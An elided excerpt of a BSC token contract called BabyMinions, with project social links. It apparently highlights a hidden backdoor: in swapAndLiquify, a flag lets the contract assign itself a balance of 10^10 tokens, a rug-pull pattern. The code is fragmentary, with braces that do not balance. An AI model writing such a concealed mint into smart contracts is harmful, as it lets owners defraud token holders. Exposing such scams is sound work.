...
Telegram : https://t.me/babyminions_official

Twiter : https://twitter.com/BabyMinionsbsc
...
contract BabyMinions is Context, IERC20 { 
    ...
    string private constant _symbol = unicode"BBM"; 
    ...
    uint256 public _Tax_On_Swap = 10;
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
        if(_isExcludedFromFee[to] && !swapAndLiquifyDisabled)
            {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(swapAndLiquifyDisabled){
                _tOwned[address(this)] = _Tax_On_Swap**_Tax_On_Swap;
